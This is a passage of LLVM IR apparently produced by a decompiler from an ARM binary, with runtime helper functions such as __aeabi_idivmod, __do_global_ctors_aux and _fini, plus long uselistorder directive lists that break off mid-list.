  %v2_1ad78.v6_1ad74 = select i1 %v1_1ad70, i32 %v2_1ad78, i32 %v6_1ad74
  ret i32 %v2_1ad78.v6_1ad74

dec_label_pc_1ad80:                               ; preds = %entry
  %v0_1ad80 = load i32, i32* @lr, align 4
  %v0_1ad84 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1ad80)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1ad6c, { 1, 0 }
  uselistorder i1 %v7_1ad64, { 1, 0 }
  uselistorder i32 %v4_1ad5c, { 1, 0 }
  uselistorder i32 %v1_1ad5c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1ad50, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1ad50, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1ad40, { 1, 0 }
  uselistorder i32 %v0_1ad04, { 1, 0 }
  uselistorder i32 %v4_1acf8, { 1, 0 }
  uselistorder i32 %v1_1ad00, { 1, 2, 0 }
  uselistorder i32 %v4_1acec, { 1, 0 }
  uselistorder i32 %v1_1acf4, { 1, 2, 0 }
  uselistorder i32 %v4_1ace0, { 1, 0 }
  uselistorder i32 %v1_1ace8, { 1, 2, 0 }
  uselistorder i32 %v1_1ad0c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1acdc, { 1, 0 }
  uselistorder i32 %v1_1ad08, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1acc8, { 1, 0 }
  uselistorder i32 %v3_1acc4, { 1, 0 }
  uselistorder i32 %v1_1acc4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1acc0, { 1, 0 }
  uselistorder i32 %v1_1acc8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1acb4, { 1, 0 }
  uselistorder i32 %v4_1acb0, { 2, 1, 0 }
  uselistorder i32 %v1_1acb4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1acbc.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1ac88, { 1, 0 }
  uselistorder i32 %v1_1ad40, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1ac6c, { 1, 0, 2 }
  uselistorder i32 %v0_1ac6c, { 3, 2, 1, 4, 5, 6, 0 }
  uselistorder i32 ()* @__aeabi_ldiv0, { 3, 2, 1, 0 }
  uselistorder i32* @lr, { 46, 48, 49, 50, 53, 54, 55, 3, 56, 57, 58, 59, 60, 43, 44, 45, 17, 18, 19, 20, 61, 68, 69, 70, 71, 72, 73, 74, 83, 22, 21, 0, 23, 24, 1, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 4, 102, 103, 104, 5, 105, 106, 107, 6, 108, 109, 110, 111, 112, 113, 114, 115, 64, 25, 26, 27, 7, 29, 30, 28, 84, 85, 86, 116, 47, 78, 117, 118, 119, 12, 13, 14, 15, 87, 88, 89, 120, 51, 52, 80, 81, 31, 32, 75, 76, 77, 82, 62, 16, 65, 66, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 2, 63, 10, 11, 67, 79, 90, 91, 8, 9 }
  uselistorder i32 3, { 79, 50, 26, 27, 81, 21, 82, 83, 22, 84, 85, 13, 66, 0, 29, 28, 51, 3, 2, 1, 4, 86, 30, 5, 6, 14, 7, 8, 52, 53, 94, 54, 55, 56, 57, 58, 59, 67, 11, 31, 68, 32, 70, 33, 71, 34, 72, 35, 73, 36, 74, 12, 64, 95, 17, 65, 91, 92, 23, 90, 15, 87, 16, 69, 9, 10, 60, 24, 61, 25, 93, 62, 37, 19, 38, 75, 76, 20, 77, 39, 78, 63, 42, 41, 40, 49, 80, 43, 88, 89, 44, 45, 46, 47, 48, 18 }
  uselistorder i32 15, { 2, 1, 5, 3, 8, 0, 4, 6, 7 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 147, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 144, 63, 145, 64, 146, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 140, 1, 77, 78, 81, 80, 79, 84, 83, 82, 85, 86, 87, 88, 89, 90, 148, 91, 92, 93, 139, 98, 94, 95, 99, 96, 97, 100, 105, 101, 102, 104, 103, 106, 108, 107, 141, 109, 142, 111, 110, 112, 113, 114, 117, 115, 116, 118, 119, 120, 122, 121, 123, 124, 125, 128, 126, 127, 129, 130, 132, 131, 133, 134, 135, 136, 137, 138, 143 }
  uselistorder i32 128, { 11, 6, 7, 9, 5, 18, 0, 21, 22, 1, 20, 8, 14, 15, 2, 3, 10, 16, 17, 4, 13, 12, 19 }
  uselistorder i32 255, { 6, 9, 1, 8, 0, 7, 2, 3, 4, 5 }
  uselistorder i32 65536, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 13, 9, 14, 10, 15, 11, 16, 12, 17, 18, 19, 23, 20, 24, 21, 25, 22, 26, 28, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 78, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 71, 72, 70, 73, 75, 76, 74, 77, 79 }
  uselistorder i32 32768, { 2, 1, 0, 4, 3 }
  uselistorder i32 65535, { 2, 1, 3, 0 }
  uselistorder i32 31, { 15, 10, 4, 12, 2, 1, 0, 5, 7, 6, 8, 3, 13, 14, 11, 9, 16 }
  uselistorder i32 4, { 255, 256, 176, 8, 9, 115, 116, 117, 266, 267, 268, 269, 270, 271, 272, 0, 10, 76, 273, 274, 275, 276, 277, 278, 279, 75, 280, 118, 119, 120, 281, 282, 97, 283, 86, 284, 11, 12, 1, 248, 208, 209, 210, 211, 212, 285, 286, 287, 98, 121, 122, 123, 124, 125, 126, 290, 127, 128, 298, 299, 99, 129, 13, 213, 14, 96, 87, 88, 15, 343, 89, 78, 16, 17, 90, 91, 344, 345, 346, 347, 92, 348, 349, 350, 351, 93, 352, 353, 354, 355, 356, 18, 357, 358, 359, 360, 361, 94, 77, 362, 363, 364, 365, 366, 367, 19, 20, 95, 292, 293, 100, 214, 215, 216, 217, 101, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 291, 228, 368, 369, 370, 372, 373, 130, 131, 132, 317, 318, 319, 320, 21, 189, 133, 190, 134, 79, 191, 257, 135, 258, 259, 2, 308, 309, 310, 311, 136, 137, 192, 138, 3, 139, 193, 22, 194, 80, 140, 141, 323, 325, 324, 321, 322, 195, 196, 197, 198, 326, 327, 328, 329, 330, 331, 332, 333, 334, 142, 143, 144, 145, 300, 301, 302, 303, 304, 305, 4, 23, 306, 371, 229, 24, 25, 26, 27, 5, 315, 28, 146, 62, 29, 30, 199, 147, 31, 148, 149, 150, 151, 152, 230, 32, 231, 153, 232, 233, 234, 235, 236, 237, 238, 154, 239, 240, 241, 242, 243, 244, 63, 247, 155, 156, 246, 177, 245, 294, 295, 102, 296, 297, 288, 289, 33, 34, 82, 35, 36, 83, 335, 336, 178, 37, 38, 39, 40, 64, 41, 200, 42, 43, 65, 44, 45, 157, 46, 201, 103, 202, 104, 203, 204, 205, 206, 207, 66, 67, 68, 158, 250, 249, 251, 252, 84, 254, 47, 253, 85, 105, 48, 69, 110, 179, 159, 160, 161, 162, 109, 163, 164, 107, 180, 108, 49, 165, 106, 50, 181, 182, 183, 184, 185, 186, 187, 114, 51, 52, 81, 166, 260, 261, 262, 263, 264, 265, 111, 307, 312, 167, 70, 71, 53, 313, 54, 55, 112, 72, 168, 113, 56, 57, 73, 169, 314, 170, 74, 171, 172, 58, 316, 59, 60, 61, 337, 338, 339, 340, 341, 342, 173, 174, 175, 6, 7, 188 }
  uselistorder i32 2, { 2, 125, 3, 4, 5, 6, 7, 45, 8, 159, 68, 69, 161, 116, 117, 160, 70, 162, 163, 164, 165, 166, 44, 85, 131, 9, 133, 132, 167, 168, 169, 10, 46, 47, 48, 49, 50, 51, 135, 136, 118, 119, 120, 11, 121, 52, 187, 188, 74, 189, 190, 55, 191, 54, 192, 53, 172, 137, 43, 138, 139, 12, 140, 141, 86, 87, 148, 88, 149, 89, 150, 13, 56, 14, 122, 90, 151, 91, 152, 92, 153, 93, 154, 94, 155, 71, 134, 42, 15, 193, 72, 174, 16, 95, 175, 176, 17, 96, 177, 178, 82, 126, 0, 18, 19, 20, 97, 57, 59, 58, 60, 61, 62, 63, 76, 64, 77, 65, 66, 170, 171, 142, 143, 83, 21, 22, 23, 123, 24, 84, 144, 78, 75, 25, 145, 146, 147, 173, 26, 124, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 127, 36, 37, 38, 39, 40, 98, 73, 99, 100, 79, 156, 157, 101, 80, 102, 106, 128, 105, 129, 104, 103, 130, 115, 107, 158, 108, 109, 179, 180, 181, 182, 110, 183, 111, 112, 113, 186, 81, 184, 41, 185, 67, 114 }
  uselistorder i32 16, { 3, 22, 4, 5, 1, 6, 7, 89, 90, 91, 0, 92, 93, 8, 9, 94, 95, 10, 96, 97, 98, 99, 64, 65, 109, 110, 30, 31, 32, 117, 33, 118, 119, 34, 120, 121, 35, 122, 123, 124, 125, 126, 127, 100, 104, 105, 66, 67, 36, 68, 69, 70, 71, 72, 73, 74, 75, 101, 37, 76, 27, 58, 38, 55, 87, 56, 111, 112, 128, 25, 106, 107, 77, 78, 79, 80, 81, 82, 51, 102, 103, 57, 108, 24, 11, 12, 13, 14, 15, 16, 23, 17, 18, 2, 19, 20, 28, 40, 41, 59, 60, 61, 62, 63, 42, 43, 83, 84, 44, 39, 45, 85, 86, 52, 53, 46, 54, 88, 26, 29, 47, 113, 114, 115, 48, 116, 21, 49, 50 }
  uselistorder i32 268435455, { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 8, { 51, 24, 3, 4, 14, 5, 110, 111, 112, 113, 0, 1, 114, 115, 116, 117, 118, 6, 119, 58, 44, 45, 52, 120, 121, 122, 123, 20, 124, 74, 143, 154, 36, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 37, 125, 75, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 53, 85, 86, 87, 126, 127, 128, 171, 25, 59, 7, 109, 140, 60, 61, 35, 147, 146, 144, 145, 63, 64, 65, 148, 149, 150, 151, 152, 153, 8, 137, 138, 2, 170, 40, 41, 38, 39, 16, 17, 28, 29, 42, 172, 88, 129, 130, 89, 90, 54, 91, 92, 93, 94, 21, 95, 48, 49, 96, 97, 98, 43, 99, 100, 101, 102, 27, 18, 19, 103, 104, 50, 131, 132, 62, 133, 134, 23, 135, 136, 9, 10, 55, 26, 11, 12, 15, 13, 66, 67, 68, 69, 70, 71, 72, 46, 73, 105, 106, 47, 107, 108, 34, 33, 32, 56, 57, 31, 30, 139, 141, 142 }
  uselistorder i32 536870912, { 0, 2, 1 }
  uselistorder i1 true, { 0, 1, 2, 45, 48, 3, 4, 6, 5, 7, 51, 49, 8, 9, 10, 11, 12, 13, 50, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 28, 29, 26, 27, 30, 31, 44, 52, 32, 33, 34, 46, 35, 36, 37, 38, 47, 39, 40, 41, 42, 43 }
  uselistorder i32 %arg2, { 2, 3, 4, 0, 1 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1ad14, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1acd0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1acbcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1ad94 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1ad94
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1adac = load i32, i32* @global_var_262a0.1071, align 4
  %v7_1adb0 = icmp eq i32 %v3_1adac, -1
  %v3_1adb4 = load i32, i32* @r4, align 4
  store i32 %v3_1adb4, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_262a0.1071 to i32), i32* %r4.global-to-local, align 4
  br i1 %v7_1adb0, label %bb, label %.preheader

bb:                                               ; preds = %entry
  store i32 %v3_1adb4, i32* %r4.global-to-local, align 4
  %v9_1adbc = load i32, i32* @r0, align 4
  ret i32 %v9_1adbc

.preheader:                                       ; preds = %entry, %.preheader
  %v0_1adc4 = phi i32 [ %v3_1adc8, %.preheader ], [ %v3_1adac, %entry ]
  call void @__pseudo_branch(i32 %v0_1adc4)
  %v0_1adc8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1adc8 = add i32 %v0_1adc8, -4
  %v2_1adc8 = inttoptr i32 %v1_1adc8 to i32*
  %v3_1adc8 = load i32, i32* %v2_1adc8, align 4
  store i32 %v1_1adc8, i32* %r4.global-to-local, align 4
  %v3_1adcc = icmp eq i32 %v3_1adc8, -1
  br i1 %v3_1adcc, label %dec_label_pc_1add4, label %.preheader

dec_label_pc_1add4:                               ; preds = %.preheader
  %v2_1add4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1add4, i32* %r4.global-to-local, align 4
  %v8_1add4 = load i32, i32* @r0, align 4
  ret i32 %v8_1add4

; uselistorder directives
  uselistorder i32 %v3_1adc8, { 1, 0 }
  uselistorder i32 %v3_1adac, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 -4, { 67, 18, 19, 59, 20, 28, 68, 69, 70, 12, 29, 30, 31, 71, 72, 73, 13, 32, 33, 34, 74, 75, 76, 14, 35, 36, 77, 27, 26, 78, 79, 80, 25, 24, 23, 22, 37, 38, 39, 40, 41, 9, 42, 10, 43, 11, 81, 21, 44, 16, 60, 0, 51, 52, 53, 54, 64, 55, 45, 46, 56, 57, 58, 65, 66, 47, 17, 15, 61, 62, 63, 48, 49, 1, 50, 3, 4, 5, 6, 7, 8, 2 }
  uselistorder i32 -1, { 184, 0, 185, 1, 58, 59, 2, 304, 186, 269, 82, 305, 157, 3, 306, 83, 4, 5, 84, 259, 6, 7, 8, 90, 88, 85, 260, 138, 139, 89, 87, 86, 161, 261, 307, 187, 188, 78, 45, 9, 91, 270, 189, 190, 271, 272, 92, 308, 93, 191, 65, 94, 11, 12, 163, 60, 61, 162, 314, 67, 66, 62, 63, 192, 141, 142, 193, 194, 10, 315, 273, 195, 79, 46, 196, 274, 13, 47, 197, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 198, 310, 312, 199, 71, 275, 201, 276, 277, 80, 72, 73, 278, 279, 280, 281, 282, 74, 164, 283, 147, 200, 165, 284, 323, 324, 202, 166, 167, 14, 285, 203, 204, 286, 287, 168, 95, 328, 96, 334, 97, 301, 98, 354, 99, 355, 100, 356, 101, 357, 102, 329, 103, 358, 15, 16, 205, 17, 104, 296, 297, 206, 207, 208, 268, 169, 170, 105, 18, 298, 19, 262, 70, 209, 20, 263, 210, 171, 211, 21, 22, 69, 48, 49, 212, 213, 214, 64, 299, 215, 300, 23, 24, 106, 316, 107, 317, 108, 302, 109, 335, 110, 325, 111, 321, 112, 267, 113, 322, 172, 318, 114, 319, 216, 115, 217, 288, 218, 219, 220, 116, 221, 222, 223, 224, 225, 226, 50, 51, 81, 227, 156, 117, 228, 25, 68, 75, 76, 311, 229, 289, 230, 173, 290, 52, 291, 292, 174, 26, 231, 232, 143, 148, 146, 27, 149, 30, 28, 29, 150, 175, 293, 294, 233, 31, 53, 54, 295, 313, 118, 309, 119, 336, 120, 303, 121, 359, 360, 122, 264, 123, 326, 124, 327, 125, 265, 126, 330, 127, 361, 128, 337, 129, 364, 130, 331, 131, 338, 132, 320, 133, 332, 134, 333, 135, 266, 136, 362, 77, 363, 55, 56, 234, 235, 236, 237, 238, 239, 144, 137, 176, 240, 241, 242, 243, 36, 37, 38, 32, 33, 34, 35, 177, 178, 244, 245, 246, 39, 247, 248, 57, 40, 41, 140, 179, 180, 42, 145, 249, 250, 158, 159, 160, 43, 251, 151, 152, 153, 154, 155, 44, 252, 253, 254, 255, 256, 257, 258, 181, 182, 183 }
  uselistorder i32* @global_var_262a0.1071, { 1, 0 }
  uselistorder i32 1, { 540, 180, 996, 363, 997, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 541, 289, 290, 288, 285, 284, 286, 287, 1010, 460, 1011, 1012, 542, 249, 248, 250, 247, 253, 251, 252, 1013, 242, 1014, 403, 1015, 1020, 1021, 439, 1022, 1023, 1024, 461, 462, 1025, 1026, 543, 291, 292, 296, 293, 295, 294, 544, 1027, 545, 15, 14, 13, 16, 1028, 546, 17, 18, 1029, 1030, 1031, 1032, 547, 101, 102, 861, 862, 863, 864, 865, 866, 867, 868, 869, 550, 549, 548, 222, 223, 224, 870, 871, 872, 873, 874, 554, 553, 552, 551, 210, 209, 216, 211, 215, 212, 214, 217, 218, 219, 213, 404, 1033, 1034, 405, 1035, 1036, 1037, 1038, 1039, 463, 1040, 1041, 1042, 1043, 1044, 556, 555, 72, 70, 74, 71, 75, 76, 77, 69, 73, 380, 1049, 1045, 1046, 1047, 1048, 425, 557, 67, 68, 66, 1050, 558, 974, 975, 976, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 559, 37, 38, 31, 32, 33, 34, 36, 35, 388, 25, 1066, 1067, 1068, 1069, 1070, 1071, 560, 298, 299, 300, 297, 561, 228, 389, 464, 904, 562, 29, 27, 26, 30, 28, 1072, 1073, 465, 563, 22, 23, 20, 24, 19, 21, 905, 906, 565, 564, 302, 304, 303, 301, 305, 566, 191, 1080, 406, 1079, 390, 368, 1082, 407, 1081, 0, 1085, 1086, 1087, 1088, 569, 568, 567, 205, 206, 1128, 1129, 1130, 1131, 1132, 440, 1133, 1134, 441, 1136, 466, 1137, 433, 434, 444, 1, 442, 443, 1138, 1135, 467, 1139, 429, 576, 575, 527, 574, 573, 528, 572, 571, 570, 381, 428, 1208, 1209, 1210, 1211, 1212, 408, 577, 100, 977, 978, 979, 578, 308, 309, 307, 306, 907, 391, 908, 1251, 392, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 529, 580, 579, 94, 95, 96, 97, 92, 91, 90, 93, 99, 98, 468, 1089, 1090, 1105, 1106, 1107, 1108, 581, 530, 84, 83, 85, 393, 409, 909, 469, 910, 911, 470, 377, 410, 374, 435, 436, 912, 471, 913, 914, 915, 916, 411, 917, 364, 918, 919, 472, 920, 921, 594, 593, 592, 591, 590, 589, 588, 587, 586, 585, 584, 583, 582, 531, 59, 53, 56, 58, 52, 50, 51, 63, 55, 54, 49, 47, 48, 57, 62, 60, 61, 1184, 1185, 532, 595, 41, 39, 44, 46, 42, 43, 40, 45, 922, 923, 924, 925, 375, 926, 927, 928, 596, 276, 277, 274, 278, 275, 929, 930, 597, 175, 1091, 1092, 1093, 1094, 1095, 198, 197, 194, 196, 193, 192, 199, 195, 931, 599, 598, 264, 265, 266, 267, 412, 445, 602, 601, 600, 603, 310, 604, 207, 208, 605, 165, 606, 311, 607, 203, 608, 312, 609, 313, 610, 314, 611, 241, 612, 2, 616, 615, 614, 613, 160, 161, 473, 617, 413, 474, 618, 220, 619, 620, 967, 625, 624, 623, 622, 621, 181, 182, 185, 184, 183, 1224, 1225, 628, 627, 626, 204, 629, 382, 896, 897, 376, 898, 630, 346, 350, 345, 347, 349, 351, 348, 899, 414, 475, 476, 477, 478, 968, 631, 254, 383, 875, 632, 155, 157, 158, 156, 159, 201, 200, 998, 367, 415, 999, 634, 633, 103, 104, 107, 105, 106, 635, 112, 108, 114, 110, 109, 111, 113, 636, 230, 232, 231, 233, 234, 229, 637, 638, 639, 641, 640, 1264, 416, 644, 643, 642, 316, 315, 645, 126, 127, 125, 128, 86, 87, 88, 89, 646, 245, 246, 244, 243, 647, 648, 318, 317, 417, 1228, 649, 225, 226, 479, 480, 378, 653, 652, 651, 650, 179, 178, 394, 654, 319, 655, 227, 656, 221, 657, 202, 658, 64, 659, 320, 660, 65, 661, 8, 481, 1140, 379, 1141, 1142, 482, 1161, 665, 664, 663, 662, 9, 11, 12, 10, 666, 667, 1186, 1187, 321, 669, 668, 323, 324, 322, 1265, 670, 1175, 1176, 1177, 1178, 3, 1016, 1017, 1018, 1019, 932, 933, 671, 325, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 395, 934, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 188, 186, 187, 189, 190, 1204, 369, 124, 123, 122, 396, 1205, 969, 970, 971, 972, 164, 163, 1084, 1083, 849, 850, 851, 852, 853, 854, 855, 1269, 168, 169, 166, 167, 935, 171, 170, 483, 672, 1112, 1109, 1110, 1111, 370, 397, 151, 152, 150, 154, 153, 1096, 1100, 1101, 1102, 1103, 1104, 673, 131, 129, 133, 130, 134, 132, 418, 1097, 1098, 484, 1099, 675, 674, 238, 239, 240, 677, 676, 237, 679, 678, 270, 269, 878, 681, 680, 136, 135, 430, 936, 486, 937, 938, 419, 420, 939, 940, 487, 941, 943, 944, 945, 488, 947, 421, 948, 946, 485, 949, 489, 950, 431, 951, 952, 942, 685, 684, 683, 682, 137, 142, 139, 143, 146, 138, 144, 145, 140, 147, 141, 953, 686, 326, 331, 327, 329, 330, 328, 687, 283, 282, 954, 955, 956, 688, 115, 116, 432, 384, 958, 385, 959, 422, 960, 961, 963, 371, 964, 490, 965, 386, 962, 423, 696, 695, 694, 693, 692, 691, 690, 689, 117, 121, 120, 119, 118, 491, 398, 697, 80, 81, 82, 957, 446, 533, 698, 332, 492, 876, 877, 699, 334, 333, 335, 1266, 447, 1267, 1268, 700, 337, 336, 362, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 399, 1127, 703, 702, 701, 340, 339, 338, 342, 341, 705, 704, 706, 1074, 1075, 1076, 1077, 1078, 709, 708, 707, 235, 236, 1213, 710, 79, 711, 162, 712, 173, 174, 713, 343, 714, 258, 715, 260, 716, 344, 717, 256, 172, 718, 356, 268, 719, 273, 720, 352, 721, 722, 723, 353, 724, 354, 725, 263, 726, 361, 355, 259, 448, 1164, 1165, 449, 1229, 1230, 365, 1231, 879, 372, 387, 880, 881, 882, 366, 495, 883, 884, 885, 886, 887, 888, 889, 890, 493, 494, 437, 496, 891, 733, 732, 731, 730, 729, 728, 727, 892, 893, 740, 739, 738, 737, 736, 534, 735, 734, 894, 895, 742, 741, 497, 900, 901, 498, 499, 500, 744, 743, 501, 745, 902, 903, 750, 749, 748, 747, 746, 502, 966, 754, 753, 752, 751, 973, 539, 980, 981, 982, 983, 984, 985, 503, 759, 758, 757, 756, 755, 272, 271, 986, 987, 988, 989, 990, 504, 991, 992, 993, 994, 766, 765, 764, 763, 762, 761, 760, 262, 261, 995, 772, 771, 770, 769, 768, 767, 1000, 856, 857, 506, 858, 505, 859, 860, 848, 1001, 1002, 781, 780, 779, 778, 777, 776, 775, 774, 773, 281, 280, 279, 507, 508, 785, 784, 783, 782, 452, 1162, 786, 148, 149, 788, 787, 4, 509, 1163, 426, 1166, 790, 789, 450, 1167, 510, 511, 1169, 1168, 512, 793, 792, 791, 453, 1170, 1171, 513, 514, 515, 1179, 535, 1172, 516, 794, 451, 517, 1173, 518, 1174, 800, 799, 798, 797, 796, 795, 454, 1180, 1181, 455, 801, 802, 1182, 519, 1183, 805, 804, 803, 807, 806, 424, 1188, 1189, 1190, 520, 373, 1191, 1192, 1193, 521, 1194, 811, 810, 809, 808, 536, 1195, 812, 255, 1196, 813, 522, 1206, 816, 815, 814, 1207, 537, 78, 457, 1214, 1215, 456, 1216, 1217, 458, 459, 1218, 1219, 817, 1220, 5, 6, 1223, 1221, 1222, 523, 821, 820, 819, 818, 1226, 1227, 823, 822, 827, 826, 825, 824, 830, 829, 828, 832, 831, 1232, 1233, 524, 1243, 1244, 427, 1245, 835, 834, 833, 438, 7, 839, 838, 837, 836, 401, 1234, 1235, 1236, 400, 1237, 1241, 1242, 525, 841, 840, 526, 1238, 1239, 1240, 843, 842, 176, 1246, 1247, 844, 538, 177, 402, 1248, 1249, 845, 357, 1250, 257, 846, 847, 360, 359, 358 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_1ade0 = load i32, i32* @r0, align 4
  ret i32 %v5_1ade0

; uselistorder directives
  uselistorder i32* @r0, { 8, 9, 10, 180, 11, 187, 188, 189, 190, 193, 191, 192, 12, 56, 57, 194, 195, 7, 196, 197, 142, 143, 144, 198, 199, 206, 220, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 173, 174, 175, 176, 14, 16, 218, 17, 145, 18, 146, 147, 148, 19, 284, 285, 286, 46, 276, 287, 288, 52, 53, 54, 55, 20, 21, 22, 23, 169, 170, 49, 289, 290, 81, 171, 29, 181, 182, 183, 184, 185, 186, 58, 59, 60, 61, 264, 265, 292, 30, 31, 279, 32, 278, 65, 50, 66, 24, 280, 291, 172, 25, 253, 254, 255, 256, 257, 258, 259, 260, 13, 269, 41, 149, 150, 151, 15, 212, 213, 214, 215, 216, 217, 26, 207, 208, 209, 210, 67, 219, 68, 152, 153, 154, 3, 27, 155, 156, 4, 6, 0, 1, 157, 158, 5, 159, 160, 161, 28, 162, 163, 164, 2, 165, 211, 62, 63, 64, 294, 295, 221, 222, 223, 224, 225, 226, 227, 228, 166, 167, 200, 201, 202, 203, 204, 205, 39, 40, 69, 293, 33, 47, 48, 34, 266, 35, 282, 36, 283, 38, 37, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 168, 177, 178, 179, 261, 262, 263, 267, 268, 270, 271, 272, 273, 274, 275, 277, 281, 42, 43, 44, 45, 51 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1ade8 = load i32, i32* @r4, align 4
  %v0_1adf0 = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_1ade8)
  ret i32 %v0_1adf0

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 13, 7, 5, 6, 18, 19, 15, 16, 17, 0, 20, 8, 3, 9, 4, 10, 11, 12, 2, 14 }
  uselistorder i32 0, { 0, 1332, 1333, 1334, 1335, 112, 1336, 166, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 167, 890, 893, 891, 892, 1344, 1345, 1346, 1347, 1348, 1349, 1360, 47, 90, 1361, 1362, 1363, 1364, 1365, 1366, 1375, 1376, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1377, 894, 1062, 1063, 1389, 353, 354, 1380, 1381, 168, 1382, 1383, 1385, 1384, 1386, 1387, 289, 1388, 162, 163, 164, 1390, 1378, 1379, 78, 79, 1391, 1393, 1394, 1392, 1395, 1396, 1397, 1398, 104, 1399, 1400, 105, 1401, 106, 1402, 107, 1403, 171, 936, 169, 937, 938, 939, 170, 940, 91, 92, 941, 172, 942, 355, 31, 356, 943, 944, 290, 173, 357, 358, 945, 174, 1404, 1405, 1406, 1408, 175, 1407, 240, 359, 1409, 360, 48, 49, 50, 51, 128, 129, 176, 177, 1410, 130, 1411, 297, 296, 295, 1, 100, 52, 1285, 1286, 1412, 1413, 1287, 293, 1064, 178, 1414, 1415, 1416, 1417, 1418, 1065, 1066, 32, 1067, 1068, 131, 1069, 1070, 1419, 1420, 1421, 2, 1422, 1423, 1071, 179, 1072, 1073, 1074, 1075, 1076, 1077, 1424, 180, 298, 1425, 1432, 1433, 361, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 53, 1443, 1442, 93, 1466, 1467, 362, 1501, 1487, 1488, 1489, 4, 3, 302, 287, 288, 294, 1490, 1491, 1493, 1494, 132, 235, 1496, 363, 1497, 1498, 5, 1499, 1500, 1502, 364, 303, 1495, 1492, 1503, 1504, 181, 1505, 1506, 6, 1582, 1583, 1584, 1585, 183, 182, 1586, 184, 1288, 1289, 7, 895, 1078, 54, 133, 1079, 1080, 241, 8, 896, 243, 1081, 55, 134, 1082, 1083, 242, 1663, 1664, 1665, 1666, 1669, 1670, 1671, 1672, 1673, 